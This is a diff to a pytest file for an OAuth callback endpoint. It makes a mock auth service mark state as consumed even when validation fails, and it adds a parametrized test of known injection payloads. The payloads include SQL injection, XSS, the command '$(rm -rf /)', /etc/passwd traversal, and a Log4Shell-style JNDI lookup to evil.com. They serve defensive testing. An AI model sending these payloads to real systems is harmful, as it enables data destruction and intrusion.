@@ -94,34 +94,37 @@ def mock_auth_service():
         behavior AFTER FastAPI validation, when handle_callback receives the values.
         Empty strings that pass FastAPI validation are rejected here.
         """
-        # Basic input validation - empty strings are invalid
-        # (FastAPI handles missing params with 422, this handles empty strings)
-        if not code or code.strip() == "":
-            raise ValueError("Authorization code cannot be empty")
-        if not state or state.strip() == "":
-            raise ValueError("State parameter cannot be empty")
-        
-        # Simulate invalid/expired session semantics via prefixes
-        if state.startswith("invalid"):
-            raise ValueError("Invalid or expired state")
-        if state.startswith("expired"):
-            raise ValueError("Session expired")
-        
-        # Enforce single-use state to simulate replay protection
-        if state in used_states:
-            raise ValueError("State already used")
-        
-        # Simulate provider-auth error on bad authorization code
-        if code == "bad_code":
-            # Use a simple ValueError instead of importing from copilot_auth
-            # to avoid import issues when adapter is not installed
-            raise ValueError("Invalid authorization code")
-        
-        # Mark state as consumed after successful validation
-        used_states.add(state)
-        
-        # Return a mock JWT token
-        return "mock.jwt.token"
+        try:
+            # Basic input validation - empty strings are invalid
+            # (FastAPI handles missing params with 422, this handles empty strings)
+            if not code or code.strip() == "":
+                raise ValueError("Authorization code cannot be empty")
+            if not state or state.strip() == "":
+                raise ValueError("State parameter cannot be empty")
+            
+            # Simulate invalid/expired session semantics via prefixes
+            if state.startswith("invalid"):
+                raise ValueError("Invalid or expired state")
+            if state.startswith("expired"):
+                raise ValueError("Session expired")
+            
+            # Enforce single-use state to simulate replay protection
+            if state in used_states:
+                raise ValueError("State already used")
+            
+            # Simulate provider-auth error on bad authorization code
+            if code == "bad_code":
+                # Use a simple ValueError instead of importing from copilot_auth
+                # to avoid import issues when adapter is not installed
+                raise ValueError("Invalid authorization code")
+            
+            # Return a mock JWT token
+            return "mock.jwt.token"
+        finally:
+            # Mark state as consumed even when validation or downstream logic fails,
+            # to mirror the real auth service's replay protection behavior.
+            # (See auth/app/service.py lines 578-581)
+            used_states.add(state)
     
     service.handle_callback = mock_handle_callback
     service.is_ready.return_value = True
@@ -228,16 +231,12 @@ class TestCallbackPropertyBased:
         data = response.json()
         assert "detail" in data
     
-    @given(code=st.text(min_size=1, max_size=100))
-    @settings(
-        max_examples=50,
-        suppress_health_check=[HealthCheck.function_scoped_fixture]
-    )
-    def test_bad_auth_code_rejected(self, test_client, code: str):
+    def test_bad_auth_code_rejected(self, test_client):
         """Property: Invalid authorization codes should be rejected.
         
         Tests that the endpoint properly validates authorization codes
-        from the OIDC provider.
+        from the OIDC provider. Uses the special "bad_code" value
+        that the mock is configured to reject.
         """
         # Use "bad_code" to trigger auth error
         response = test_client.get(
@@ -263,38 +262,63 @@ class TestCallbackPropertyBased:
     def test_no_injection_in_parameters(self, test_client, text: str):
         """Property: Callback should not be vulnerable to injection attacks.
         
-        Tests that special characters, SQL injection attempts, XSS payloads,
-        and command injection attempts are safely handled.
+        This Hypothesis-based test exercises a single payload per example.
+        Static, known-bad payloads are covered by test_common_injection_payloads
+        to avoid multiplying the number of Hypothesis examples.
         """
-        # Test common injection patterns
-        injection_attempts = [
-            text,  # Random text
+        payload = text
+        
+        response = test_client.get(
+            "/callback",
+            params={"code": payload, "state": payload}
+        )
+        
+        # Should handle gracefully
+        assert 100 <= response.status_code < 600
+        
+        # Response should not echo back payload unescaped
+        response_text = response.text
+        # Basic check: if payload contains <script>, response shouldn't
+        # contain it without HTML encoding (check case-insensitively)
+        if "<script>" in payload.lower():
+            lowered_response = response_text.lower()
+            # Response should NOT contain raw script tag - must be escaped
+            if "<script>" in lowered_response:
+                assert "&lt;script&gt;" in lowered_response, \
+                    f"XSS vulnerability: unescaped <script> in response"
+
+    @pytest.mark.parametrize(
+        "payload",
+        [
             "'; DROP TABLE users; --",  # SQL injection
             "<script>alert('xss')</script>",  # XSS
             "$(rm -rf /)",  # Command injection
             "../../etc/passwd",  # Path traversal
             "%00",  # Null byte injection
-        ]
+            "${jndi:ldap://evil.com/a}",  # Log4Shell-style
+        ],
+    )
+    def test_common_injection_payloads(self, test_client, payload: str):
+        """Direct test: known injection payloads must be safely handled.
         
-        for payload in injection_attempts:
-            response = test_client.get(
-                "/callback",
-                params={"code": payload, "state": payload}
-            )
-            
-            # Should handle gracefully
-            assert 100 <= response.status_code < 600
-            
-            # Response should not echo back payload unescaped
-            response_text = response.text
-            # Basic check: if payload contains <script>, response shouldn't
-            # contain it without HTML encoding (check case-insensitively)
-            if "<script>" in payload.lower():
-                lowered_response = response_text.lower()
-                # Response should NOT contain raw script tag - must be escaped
-                if "<script>" in lowered_response:
-                    assert "&lt;script&gt;" in lowered_response, \
-                        f"XSS vulnerability: unescaped <script> in response"
+        This complements the property-based test by explicitly checking
+        common attack patterns without multiplying Hypothesis examples.
+        """
+        response = test_client.get(
+            "/callback",
+            params={"code": payload, "state": payload}
+        )
+        
+        # Should handle gracefully
+        assert 100 <= response.status_code < 600
+        
+        # Response should not echo back payload unescaped
+        response_text = response.text
+        if "<script>" in payload.lower():
+            lowered_response = response_text.lower()
+            if "<script>" in lowered_response:
+                assert "&lt;script&gt;" in lowered_response, \
+                    f"XSS vulnerability: unescaped <script> in response"
 
 
 # ============================================================================
